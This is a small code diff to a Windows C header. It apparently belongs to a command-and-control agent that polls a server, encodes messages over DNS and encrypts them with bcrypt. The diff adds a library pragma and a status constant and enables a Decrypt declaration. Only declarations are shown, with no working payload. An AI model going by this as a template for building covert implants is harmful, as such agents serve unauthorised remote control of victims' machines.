@@ -1,4 +1,5 @@
 #pragma once
+#pragma comment(lib, "bcrypt.lib")
 #include <WinSock2.h>
 #include <Windows.h>
 #include <stdlib.h>
@@ -29,6 +30,7 @@
 #define MSG_SERVER_ACK 0x1007
 #define MSG_SERVER_RESULT 0x1008
 #define MSG_SERVER_PENDING 0x1009
+#define STATUS_SUCCESS 0x00000000
 
 #define DEFAULT_AGENT_ID 1
 #define DEFAULT_POLL_INTERVAL_MS 5000
@@ -102,4 +104,4 @@ BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYT
 
 BOOL Encrypt(PBYTE* msg, DWORD msgLength);
 
-//BOOL Decrypt(PBYTE msg);
+BOOL Decrypt(PBYTE msg, DWORD* msgLength);
